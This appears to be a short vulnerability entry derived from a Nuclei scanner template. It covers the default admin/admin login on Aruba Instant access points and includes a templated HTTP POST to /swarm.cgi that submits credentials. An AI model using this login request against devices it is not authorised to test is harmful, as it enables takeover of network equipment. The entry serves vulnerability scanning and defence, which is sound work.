# Vulnerability: Aruba Instant - Default Login
**Classification:** ARUBA
**Source:** Nuclei Template (`aruba-instant-default-login.yaml`)

## Description
Aruba Instant is an AP device. The device has a default password, and attackers can control the entire platform through the default password admin/admin vulnerability, and use administrator privileges to operate core functions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /swarm.cgi  HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

opcode=login&user={{username}}&passwd={{password}}&refresh=false&nocache=0.17699820340903838
```

